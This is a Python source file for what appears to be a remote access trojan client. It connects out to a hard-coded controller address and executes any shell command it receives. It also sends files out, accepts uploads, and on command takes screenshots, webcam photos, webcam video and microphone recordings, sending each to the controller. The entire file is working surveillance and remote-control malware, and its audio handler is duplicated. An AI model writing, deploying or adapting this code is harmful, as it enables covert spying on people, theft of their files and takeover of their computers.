import os
import platform
import socket
import subprocess
import pyautogui
import cv2
import time
import sounddevice as sd
from scipy.io.wavfile import write


BUFFER_SIZE = 1024 * 128
BUFFER_SIZE1 = 4096
HOST = '192.168.56.1'  # The server's  hostname or IP address
PORT = 6543        # The port used by the server

def func(command):
    output = subprocess.getoutput(command)
    directory = os.getcwd()
    msg = f"{output}{'<kitty>'}{directory}"
    s.send(msg.encode())

def download(socket, filename):
    if os.path.isfile(filename):
        filesize = os.path.getsize(filename)
        print(filesize)
        socket.send(f"exist<kitty>{filesize}".encode())
        f = open(filename, "rb")
        data = socket.recv(BUFFER_SIZE)
        while 1:
            bytes_read = f.read(BUFFER_SIZE1)
            if not bytes_read:
                time.sleep(3);
                socket.send('end'.encode())
                break
            socket.sendall(bytes_read)
    else:
        socket.send("not exist".encode())

def upload(socket, filename):
    f = open(filename, "wb")
    while 1:
        data = socket.recv(BUFFER_SIZE1)
        if data.decode() == 'end':
            break
        f.write(data)

def video():
    cap = cv2.VideoCapture(0)
    fps = 20.0
    image_size = (640, 480)
    video_file = 'res.avi'
    # Check if the webcam is opened correctly
    out = cv2.VideoWriter(video_file, cv2.VideoWriter_fourcc(*'XVID'), fps, image_size)
    i = 0;
    while True:
        ret, frame = cap.read()
        out.write(frame)
        time.sleep(0.05)
        i = i + 1
        if i > 100:
            break;
    cap.release()
    cv2.destroyAllWindows()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
directory = os.getcwd()
client_os = platform.system()
msg = f"{client_os}{'<kitty>'}{directory}"
s.send(msg.encode())
while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    temp = command.split(' ', 1)
    if temp[0] == 'cd':
        try:
            os.chdir(' '.join(temp[1:]))
        except FileNotFoundError as e:
            msg = str(e)
            s.send(msg.encode())
            continue
    if temp[0] == 'download':
        filename = temp[1]
        download(s, filename)
        continue
    if temp[0] == 'upload':
        filename = temp[1]
        upload(s, filename)
        continue
    if temp[0] == 'screenshot':
        image = pyautogui.screenshot("screen.jpg")
        s.send("screen.jpg".encode())
        download(s, "screen.jpg")
        os.remove("screen.jpg")
        continue
    if temp[0] == 'photo':
        cap = cv2.VideoCapture(0)

        # "Прогреваем" камеру, чтобы снимок не был тёмным
        for i in range(30):
            cap.read()

        # Делаем снимок
        ret, frame = cap.read()

        # Записываем в файл
        cv2.imwrite("capture.jpg", frame)

        # Отключаем камеру
        cap.release()
        s.send("capture.jpg".encode())
        download(s, "capture.jpg")
        os.remove('capture.jpg')
        continue

    if temp[0] == 'video':
        video()
        s.send('res.avi'.encode())
        download(s, 'res.avi')
        os.remove('res.avi')
    if temp[0] == 'audio':
        fs = 44100  # Sample rate
        seconds = 5  # Duration of recording

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait until recording is finished
        write('output.wav', fs, myrecording)  # Save as WAV file
        s.send('output.wav'.encode())
        download(s, 'output.wav')
        os.remove('output.wav')
        continue

    if temp[0] == 'audio':
        fs = 44100  # Sample rate
        seconds = 5  # Duration of recording

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait until recording is finished
        write('output.wav', fs, myrecording)  # Save as WAV file
        s.send('output.wav'.encode())
        download(s, 'output.wav')
        os.remove('output.wav')
        continue

    func(command)


s.close()
